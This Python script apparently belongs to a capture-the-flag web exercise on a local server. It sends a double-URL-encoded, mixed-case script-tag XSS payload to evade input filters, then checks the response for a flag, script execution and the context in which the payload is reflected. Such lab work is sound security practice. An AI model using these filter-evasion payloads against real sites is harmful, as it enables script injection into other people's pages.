import requests
import urllib.parse
import re
import base64

# Base URL  
target_url = "http://127.0.0.1:32810/page"

print("="*80)
print("COMPOUND BYPASS TECHNIQUES - Multi-Encoding & Filter Evasion")
print("="*80)

# Store detailed results
detailed_results = []

def analyze_response(technique, payload, response):
    """Deep analysis of response"""
    result = {
        "technique": technique,
        "payload": payload,
        "status": response.status_code,
        "length": len(response.text),
        "has_flag": False,
        "flag_value": None,
        "execution_possible": False,
        "reflection_context": None
    }
    
    # Check for flags
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        result["has_flag"] = True
        result["flag_value"] = flags[0]
        print(f"\n🚩 FLAG FOUND in '{technique}': {flags[0]}")
        print(f"   Full Response Length: {len(response.text)}")
        print(f"   First 500 chars: {response.text[:500]}")
    
    # Check for execution indicators
    # If the payload appears unencoded in script context, it might execute
    if re.search(r'<script[^>]*>.*?(alert|eval|prompt|confirm)', response.text, re.IGNORECASE):
        result["execution_possible"] = True
        print(f"  [!] Script tag with execution code found in '{technique}'")
    
    # Check reflection context
    if payload in response.text:
        # Find where it appears
        pos = response.text.find(payload)
        context_start = max(0, pos - 100)
        context_end = min(len(response.text), pos + len(payload) + 100)
        context = response.text[context_start:context_end]
        
        # Determine context
        if 'value="' in context and '"' in context:
            result["reflection_context"] = "HTML attribute (quoted)"
        elif "'>" in context and "onclick" in context:
            result["reflection_context"] = "HTML event handler"
        else:
            result["reflection_context"] = "HTML body/text"
        
        print(f"  [i] Payload reflected in {result['reflection_context']}")
    
    return result

# Technique 1: Double-encoded + Case variations
print("\n[1] Double URL + Mixed Case")
combo1 = "%253CScRiPt%253Ealert(%2527XSS%2527)%253C%252FScRiPt%253E"
print(f"  Payload: {combo1}")
resp1 = requests.get(target_url, params={"name": combo1}, timeout=5)
detailed_results.append(analyze_response("Double URL + Mixed Case", combo1, resp1))

